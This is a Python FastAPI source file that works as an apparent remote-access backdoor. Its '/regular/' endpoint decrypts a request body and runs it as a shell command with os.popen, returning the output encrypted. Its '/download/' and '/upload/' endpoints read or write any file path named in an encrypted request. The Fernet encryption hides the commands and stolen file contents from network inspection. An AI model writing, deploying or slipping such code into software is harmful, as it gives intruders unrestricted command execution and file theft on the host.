from fastapi import FastAPI, Request
import uvicorn
from cryptography.fernet import Fernet
from os import popen

app = FastAPI()
from fastapi.responses import StreamingResponse


def load_key():
    """
    Load the previously generated key
    """
    return open("secret.key", "rb").read()


def encrypt_message(message):
    """
    Encrypts a message"
    :param message: a regular message
    :return: the encrypted message
    """
    key = load_key()
    f = Fernet(key)
    message = message.encode()
    encrypted_message = f.encrypt(message)
    return encrypted_message


def decrypt_message(encrypted_message):
    """
    Decrypts an encrypted message
    :param encrypted_message: the encrypted message to decrypt
    :return: the decrypted message
    """
    key = load_key()
    f = Fernet(key)
    decrypted_message = f.decrypt(encrypted_message)
    return decrypted_message


async def stream_back(file_name):
    """
    Yield file content in chunks
    :param file_name: A file name.
    :return: Chunks of a file.
    """
    with open(f"{file_name}", 'r') as file:
        for chunk in file:
            yield encrypt_message(chunk)


@app.put("/download/")
async def exec_download(request: Request):
    """
        Configure a path for download commands
        :param request: An encrypted download request containing a file_name.
        :return: An encrypted streaming response of a file content in chunks.
    """
    data = await request.body()
    file_name = decrypt_message(data).decode()
    return StreamingResponse(stream_back(file_name))


@app.put("/upload/{file_name}")
async def upload(request: Request, file_name, q='a'):
    """
        Configure a path for upload commands
        :param request: An encrypted upload command.
        :param file_name: A file name given in the path.
    """
    data = await request.body()
    data = decrypt_message(data).decode('unicode-escape')
    with open(f"{file_name}",
        q) as file:
        file.write(data)

@app.put("/regular/")
async def regular(request: Request):
    """
        Configure a path for regular commands
        :param request: An encrypted command.
        :return: An encrypted output for the given command.
    """
    data = await request.body()
    data = decrypt_message(data).decode()
    output = popen(data).read()
    return encrypt_message(output)


if __name__ == '__main__':
    uvicorn.run("main:app")
